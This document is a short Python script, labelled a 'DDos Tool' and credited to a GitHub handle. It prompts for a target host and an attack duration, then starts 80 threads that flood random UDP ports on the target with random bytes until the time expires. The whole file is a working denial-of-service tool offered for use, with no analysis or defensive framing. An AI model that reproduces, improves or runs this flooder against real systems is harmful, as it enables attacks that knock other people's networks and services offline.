import socket, random, threading, sys, time, os
from os import system

cmd = 'mode 50,10'
os.system(cmd)
system("title DDos Tool @hvrl")
running = True

# USER INPUT & GUI
def start():
    print('GitHub @hvrrl')
    print('')
    try:
        global TARGET
        global THREADS
        global TIME
        TARGET = str(input('ENTER YOUR TARGET: '))
        THREADS = 80
        TIME = float(input('ENTER ATTACK DURATION: '))
    except:
        print('Invalid Input')
    global timeout
    timeout = time.time() + 1*TIME
    os.system('cls')


def attack():
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendto(bytes*random.randint(5,15), (TARGET, dport))
        return
        sys.exit()
    except:
        pass
    
def main():
    while running:
        start()
        
        for x in range(0, THREADS):
            threading.Thread(target=attack).start()
            
        time.sleep(TIME)
        print('ATTACK DONE')
        time.sleep(1)
        os.system('cls')

if __name__ == '__main__':
    main()
